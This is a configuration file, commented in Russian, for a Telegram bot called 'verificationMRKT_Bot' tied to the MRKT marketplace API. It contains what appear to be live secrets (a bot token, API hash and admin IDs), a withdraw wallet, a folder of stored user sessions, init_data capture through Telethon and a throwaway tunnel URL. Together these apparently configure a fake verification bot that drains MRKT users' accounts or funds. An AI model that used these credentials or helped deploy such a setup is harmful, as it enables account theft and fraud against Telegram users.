# ══════════════════════════════════════════════
# MRKT Bot Configuration
# ══════════════════════════════════════════════

# ── Telegram Bot ──
BOT_TOKEN = "8897631554:AAHw7UTyPtAf-XPwWW2jAHgPNNfrvNCDd7w" # Получите у @BotFather
BOT_USERNAME = "verificationMRKT_Bot"  # без @

# ── Admins ──
ADMIN_IDS = [8332982896, 8926689702] # Список ID администраторов, которые могут использовать команды бота
INLINE_ALLOWED_IDS = [
]   # Список ID пользователей, которым разрешено использовать инлайн-режим бота (оставьте пустым для разрешения всем)

# ── MRKT API ──
MRKT_API_URL = "https://api.tgmrkt.io/api/v1"

# ── Telegram API (для получения init_data через Telethon/Pyrogram) ──
API_ID = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"

# ── Withdraw Wallet ──
WITHDRAW_WALLET = "UQD-0F79RLLQRXuDU7DpNN1ndlK62iaPxdI4-7oF-odOsTLU" # Адрес кошелька для вывода средств (оставьте пустым для отключения функции вывода)

# ── Logging ──
LOG_CHAT_ID = "-5557878010" # ID чата для отправки логов (оставьте пустым для отключения)

# ── Broadcast Sessions ──
BROADCAST_SESSIONS_DIR = "mrkt/sessions"

# ── WebApp URL ──
WEBAPP_URL = "https://style-james-blend-excerpt.trycloudflare.com" # URL вашего веб-приложения (например, https://yourdomain.com), используемый для генерации ссылок в боте. Оставьте пустым, если не используете веб-приложение.

# ── API Port ──
PORT = 8080 # Порт для запуска API сервера (оставьте 8080, если не уверены)
